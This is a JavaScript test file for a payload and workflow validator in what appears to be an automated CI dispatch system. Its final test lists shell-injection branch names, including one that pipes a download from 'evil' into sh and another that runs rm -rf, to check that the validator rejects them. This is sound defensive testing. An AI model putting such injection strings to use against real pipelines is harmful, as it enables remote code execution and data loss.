import test from 'node:test';
import assert from 'node:assert/strict';
import { validateConfigs, lintWorkflows, validatePayload, negativeSelftest } from '../validate.mjs';

const ROOT = new URL('../../../', import.meta.url).pathname;

test('configs: 実物の config/padn は相互整合している', () => {
  const r = validateConfigs(ROOT);
  assert.deepEqual(r.errors, []);
  assert.equal(r.ok, true);
});

test('workflow lint: 実物の 369-padn-*.yml が安全条件を満たす', () => {
  const r = lintWorkflows(ROOT);
  assert.deepEqual(r.errors, []);
  assert.equal(r.ok, true);
});

test('negative selftest: 壊れた入力の拒否が機能している', () => {
  const r = negativeSelftest(ROOT);
  assert.deepEqual(r.errors, []);
  assert.equal(r.ok, true);
});

test('payload 検証: 正常 payload は通り、欠損・改竄は拒否', () => {
  const good = {
    schema: '369-l2-dispatch-v1',
    dispatched_by: '369-padn-l2-dispatcher',
    wip_id: 'WIP-PADN-B1-001',
    wip_issue: 67,
    base_sha: '7e50a04df6dcc8043689958cbfd9be42e15e1af7',
    head_sha: '95a05dde3b9ce81d4ab4299fa25430fddfd09e5f',
    chain_depth: 1,
    idempotency_key: 'k',
    director_epoch: 1,
    lease_revision: 1,
    fencing_token: 'FT-369PADN-E1-B1-L1-7e50a04',
  };
  assert.equal(validatePayload(good, ROOT).ok, true);
  assert.equal(validatePayload({ ...good, schema: 'x' }, ROOT).ok, false);
  assert.equal(validatePayload({ ...good, wip_id: 'DROP TABLE' }, ROOT).ok, false);
  assert.equal(validatePayload({ ...good, chain_depth: 99 }, ROOT).ok, false);
  assert.equal(validatePayload({ ...good, base_sha: 'nothex' }, ROOT).ok, false);
  assert.equal(validatePayload({ ...good, fencing_token: 'FT-369PADN-E9-B1-L1-7e50a04' }, ROOT).ok, false);
  assert.equal(validatePayload({ ...good, idempotency_key: undefined }, ROOT).ok, false);
});

test('payload 検証: branch は shell injection 可能な文字を拒否する', () => {
  const base = {
    schema: '369-l2-dispatch-v1',
    dispatched_by: '369-padn-l2-dispatcher',
    wip_id: 'WIP-PADN-B1-001',
    wip_issue: 67,
    base_sha: '7e50a04df6dcc8043689958cbfd9be42e15e1af7',
    chain_depth: 1,
    idempotency_key: 'k',
  };
  assert.equal(validatePayload({ ...base, branch: 'claude/padn-b1-contract-child-tenant-v1' }, ROOT).ok, true);
  for (const evil of [
    'x";curl http://evil|sh;"',
    'x$(id)',
    'x`id`',
    'x;rm -rf .',
    'x branch',
    'x\'y',
    'x&&id',
  ]) {
    const r = validatePayload({ ...base, branch: evil }, ROOT);
    assert.equal(r.ok, false, `branch ${JSON.stringify(evil)} が拒否されなかった`);
  }
  // protected ref / allowed prefix 外は拒否（Codex R13 P1）
  for (const bad of ['main', 'master', 'release', 'release/1.0', 'production', 'gh-pages', 'codex/x', 'feature/x']) {
    assert.equal(validatePayload({ ...base, branch: bad }, ROOT).ok, false, `branch ${bad} が拒否されなかった`);
  }
  assert.equal(validatePayload({ ...base, branch: 'claude/padn-b1-contract-child-tenant-v1' }, ROOT).ok, true);
});
